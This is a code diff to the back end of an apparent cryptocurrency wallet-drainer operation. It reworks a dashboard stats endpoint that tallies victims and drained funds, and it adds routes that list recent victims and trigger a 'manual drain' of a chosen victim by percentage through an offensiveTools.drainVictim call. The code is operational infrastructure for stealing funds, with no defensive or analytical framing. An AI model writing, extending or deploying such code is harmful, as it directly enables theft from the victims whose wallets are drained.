@@ -175,23 +175,9 @@ router.get('/stats', requirePermission('canViewDashboard'), asyncHandler(async (
     ]);
 
     const stats = {
-        total: {
-            drained: totalStats[0]?.totalDrained || 0,
-            transactions: totalStats[0]?.totalTransactions || 0,
-            victims: totalStats[0]?.totalVictims || 0
-        },
-        daily: {
-            drained: dailyStats[0]?.dailyDrained || 0,
-            transactions: dailyStats[0]?.dailyTransactions || 0
-        },
-        weekly: {
-            drained: weeklyStats[0]?.weeklyDrained || 0,
-            transactions: weeklyStats[0]?.weeklyTransactions || 0
-        },
-        monthly: {
-            drained: monthlyStats[0]?.monthlyDrained || 0,
-            transactions: monthlyStats[0]?.monthlyTransactions || 0
-        },
+        totalVictims: totalStats[0]?.totalVictims || 0,
+        activeConnections: dailyStats[0]?.dailyTransactions || 0,
+        totalDrained: totalStats[0]?.totalDrained || 0,
         networks: networkStats.map(net => ({
             name: net._id,
             amount: net.amount,
@@ -216,6 +202,24 @@ router.get('/stats', requirePermission('canViewDashboard'), asyncHandler(async (
     };
 
     res.json(stats);
+}));
+
+// Proxy victims to dashboard for easy access
+router.get('/victims', requirePermission('canViewDashboard'), asyncHandler(async (req, res) => {
+    const victims = await Victim.find({})
+        .sort({ lastSeen: -1 })
+        .limit(50);
+    res.json(victims);
+}));
+
+// Manual drain proxy
+router.post('/victims/:id/drain', requirePermission('canExecuteDrains'), asyncHandler(async (req, res) => {
+    const { percentage } = req.body;
+    const victim = await Victim.findById(req.params.id);
+    if (!victim) return res.status(404).json({ message: 'Victim not found' });
+    
+    const result = await offensiveTools.drainVictim(victim, percentage);
+    res.json({ success: true, message: 'Drain initiated', data: result });
 }));
 
 // Get drain analytics with time series data
